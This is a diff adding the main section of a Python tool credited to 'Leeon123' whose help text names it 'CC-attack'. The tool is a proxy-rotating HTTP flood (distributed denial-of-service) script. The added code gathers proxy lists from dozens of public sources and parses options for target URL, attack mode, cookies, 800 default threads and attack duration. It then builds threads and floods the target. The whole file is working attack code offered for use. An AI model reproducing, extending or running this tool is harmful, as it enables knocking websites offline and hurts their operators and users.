@@ -578,3 +578,198 @@ def DownloadProxies(proxy_ver):
                         "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
                         "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
                         #"https://openproxy.space/list/http"
+                ]
+                for api in socks5_api:
+                        try:
+                                r = requests.get(api,timeout=5)
+                                f.write(r.content)
+                        except:
+                                pass
+                f.close()
+        if proxy_ver == "http":
+                f = open(out_file,'wb')
+                http_api = [
+                        "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+                        "https://www.proxy-list.download/api/v1/get?type=http",
+                        "https://www.proxyscan.io/download?type=http",
+                        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+                        "https://api.openproxylist.xyz/http.txt",
+                        "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
+                        "http://alexa.lr2b.com/proxylist.txt",
+                        #"https://www.freeproxychecker.com/result/http_proxies.txt",
+                        #"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
+                        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+                        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+                        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
+                        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
+                        "https://proxy-spider.com/api/proxies.example.txt",
+                        "https://multiproxy.org/txt_all/proxy.txt",
+                        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+                        "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
+                        "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
+                        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
+                        #"https://openproxy.space/list/http",
+                        "https://openproxylist.xyz/http.txt",
+                        "https://proxyspace.pro/http.txt",
+                        "https://proxyspace.pro/https.txt",
+                        "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
+                        "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
+                        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
+                        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
+                        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
+                        "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
+                        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+                        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
+                        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
+                        "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
+                        "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
+                        "https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
+                        "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
+                        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+                        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+                        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+                        "https://rootjazz.com/proxies/proxies.txt",
+                        "https://sheesh.rip/http.txt",
+                        #"https://spys.me/proxy.txt",
+                        "https://www.proxy-list.download/api/v1/get?type=https",
+                ]
+                for api in http_api:
+                        try:
+                                r = requests.get(api,timeout=5)
+                                f.write(r.content)
+                        except:
+                                pass
+                f.close()
+        print("> Have already downloaded proxies list as "+out_file)
+
+def PrintHelp():
+        print('''===============  CC-attack help list  ===============
+   -h/help   | showing this message
+   -url      | set target url
+   -m/mode   | set program mode
+   -data     | set post data path (only works on post mode)
+             | (Example: -data data.json)
+   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
+   -v        | set proxy type (4/5/http, default:5)
+   -t        | set threads number (default:800)
+   -f        | set proxies file (default:proxy.txt)
+   -b        | enable/disable brute mode
+             | Enable=1 Disable=0  (default:0)
+   -s        | set attack time(default:60)
+   -down     | download proxies
+   -check    | check proxies
+=====================================================''')
+
+
+def main():
+        global proxy_ver
+        global data
+        global cookies
+        global brute
+        global url
+        global out_file
+        global thread_num
+        global mode
+        global target
+        global proxies
+        target = ""
+        check_proxies = False
+        download_socks = False
+        proxy_type = 5
+        period = 60
+        help = False
+        print("> Mode: [cc/post/head]")#slow]")
+        for n,args in enumerate(sys.argv):
+                if args == "-help" or args =="-h":
+                        help =True
+                if args=="-url":
+                        ParseUrl(sys.argv[n+1])
+                if args=="-m" or args=="-mode":
+                        mode = sys.argv[n+1]
+                        if mode not in ["cc","post","head"]:#,"slow"]:
+                                print("> -m/-mode argument error")
+                                return
+                if args =="-v":
+                        proxy_ver = sys.argv[n+1]
+                        if proxy_ver == "4":
+                                proxy_type = 4
+                        elif proxy_ver == "5":
+                                proxy_type = 5
+                        elif proxy_ver == "http":
+                                proxy_type = 0
+                        elif proxy_ver not in ["4","5","http"]:
+                                print("> -v argument error (only 4/5/http)")
+                                return
+                if args == "-b":
+                        if sys.argv[n+1] == "1":
+                                brute = True
+                        elif sys.argv[n+1] == "0":
+                                brute = False
+                        else:
+                                print("> -b argument error")
+                                return
+                if args == "-t":
+                        try:
+                                thread_num = int(sys.argv[n+1])
+                        except:
+                                print("> -t must be integer")
+                                return
+                if args == "-cookies":
+                        cookies = sys.argv[n+1]
+                if args == "-data":
+                        data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
+                        data = ' '.join([str(txt) for txt in data])
+                if args == "-f":
+                        out_file = sys.argv[n+1]
+                if args == "-down":
+                        download_socks=True
+                if args == "-check":
+                        check_proxies = True
+                if args == "-s":
+                        try:
+                                period = int(sys.argv[n+1])
+                        except:
+                                print("> -s must be integer")
+                                return
+
+        if download_socks:
+                DownloadProxies(proxy_ver)
+
+        if os.path.exists(out_file)!=True:
+                print("Proxies file not found")
+                return
+        proxies = open(out_file).readlines()        
+        check_list(out_file)
+        proxies = open(out_file).readlines()        
+        if len(proxies) == 0:
+                print("> There are no more proxies. Please download a new proxies list.")
+                return
+        print ("> Number Of Proxies: %d" %(len(proxies)))
+        if check_proxies:
+                check_socks(3)
+
+        proxies = open(out_file).readlines()
+
+        if help:
+                PrintHelp()
+
+        if target == "":
+                print("> There is no target. End of process ")
+                return
+        '''
+        if mode == "slow":
+                th = threading.Thread(target=slow,args=(thread_num,proxy_type,))
+                th.daemon = True
+                th.start()
+        else:'''
+        event = threading.Event()
+        print("> Building threads...")
+        build_threads(mode,thread_num,event,proxy_type)
+        event.clear()
+        #input("Press Enter to continue.")
+        event.set()
+        print("> Flooding...")
+        time.sleep(period)
+
+if __name__ == "__main__":
+        main()#Coded by Leeon123
